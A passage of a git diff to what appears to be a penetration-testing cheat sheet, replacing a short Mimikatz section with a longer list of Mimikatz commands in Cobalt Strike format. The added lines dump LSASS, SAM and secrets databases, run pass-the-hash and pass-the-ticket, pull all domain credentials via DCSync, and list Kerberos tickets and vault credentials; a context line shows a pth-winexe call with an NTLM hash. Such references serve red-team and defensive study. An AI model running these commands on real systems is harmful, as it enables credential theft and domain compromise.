@@ -348,14 +348,61 @@ pth-winexe -U'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd7
 
 
 #Run Mimikatz
-mimikatz.exe
+#The commands are in cobalt strike format!
 
-#Controllo privilegi deve dare Privilege '20' ok
-privilege::debug
+#Dump LSASS:
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz sekurlsa::logonpasswords
 
-#Dump hash
-lsadump::lsa /patch
+#(Over) Pass The Hash
+mimikatz privilege::debug
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
 
-mimikatz.exe "privilege::debug" "token::elevate" "SEKURLSA::LogonPassword" "lsadump::sam" "lsadump::secrets" "vault::cred" "exit"
+#List all available kerberos tickets in memory
+mimikatz sekurlsa::tickets
+
+#Dump local Terminal Services credentials
+mimikatz sekurlsa::tspkg
+
+#Dump and save LSASS in a file
+mimikatz sekurlsa::minidump c:\temp\lsass.dmp
+
+#List cached MasterKeys
+mimikatz sekurlsa::dpapi
+
+#List local Kerberos AES Keys
+mimikatz sekurlsa::ekeys
+
+#Dump SAM Database
+mimikatz lsadump::sam
+
+#Dump SECRETS Database
+mimikatz lsadump::secrets
+
+#Inject and dump the Domain Controler's Credentials
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz lsadump::lsa /inject
+
+#Dump the Domain's Credentials without touching DC's LSASS and also remotely
+mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+
+#Dump old passwords and NTLM hashes of a user
+mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history
+
+#List and Dump local kerberos credentials
+mimikatz kerberos::list /dump
+
+#Pass The Ticket
+mimikatz kerberos::ptt <PathToKirbiFile>
+
+#List TS/RDP sessions
+mimikatz ts::sessions
+
+#List Vault credentials
+mimikatz vault::list
+
+
 
 ```
